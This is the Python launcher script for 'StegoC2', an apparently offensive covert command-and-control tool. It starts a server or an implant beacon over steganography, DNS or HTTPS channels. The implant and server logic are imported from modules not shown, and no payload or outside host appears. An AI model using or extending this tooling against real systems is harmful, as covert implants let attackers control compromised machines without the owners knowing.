#!/usr/bin/env python3
"""
StegoC2 - main.py
Author: mchyasn
"""

import argparse
from stego_c2 import run_stego_server, run_stego_implant
from dns_c2 import run_dns_server, run_dns_implant
from https_c2 import run_https_server, run_https_implant
from colorama import Fore, Style

def main():
    parser = argparse.ArgumentParser(description="StegoC2 - Covert C2 via Steganography or DNS")
    parser.add_argument("--mode", choices=["server", "implant"], required=True, help="Run as server or implant")
    parser.add_argument("--channel", choices=["stego", "dns", "https"], required=True, help="C2 channel to use")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    args = parser.parse_args()

    if args.mode == "server":
        print(Fore.CYAN + f"[*] Launching StegoC2 server over {args.channel}..." + Style.RESET_ALL)
        if args.channel == "stego":
            run_stego_server(verbose=args.verbose)
        elif args.channel == "dns":
            run_dns_server(verbose=args.verbose)
        elif args.channel == "https":
            run_https_server(verbose=args.verbose)

    elif args.mode == "implant":
        print(Fore.CYAN + f"[*] Launching implant beacon over {args.channel}..." + Style.RESET_ALL)
        if args.channel == "stego":
            run_stego_implant(verbose=args.verbose)
        elif args.channel == "dns":
            run_dns_implant(verbose=args.verbose)
        elif args.channel == "https":
            run_https_implant(verbose=args.verbose)

    print(Fore.GREEN + "[+] StegoC2 execution complete." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
